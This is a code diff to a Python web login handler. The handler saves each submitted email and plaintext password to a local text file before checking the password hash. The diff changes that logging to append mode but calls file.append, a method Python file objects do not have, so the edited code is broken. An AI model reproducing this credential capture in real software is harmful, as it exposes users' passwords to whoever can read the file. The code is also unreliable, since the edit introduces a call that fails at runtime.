@@ -7,9 +7,9 @@ def login():
     if request.method=='POST':
         email = request.form['email']
         password = request.form['password']
-        with open('Sign_Up_Pages\Login\Login.txt','w') as file:
-            file.write(f"Email: {email}\n")
-            file.write(f"Password: {password}\n")
+        with open('Sign_Up_Pages\Login\Login.txt','a') as file:
+            file.append(f"Email: {email}\n")
+            file.append(f"Password: {password}\n")
         try:
             user = User.query.filter_by(email=email).first()
             if user and bcrypt.check_password_hash(user.password, password):
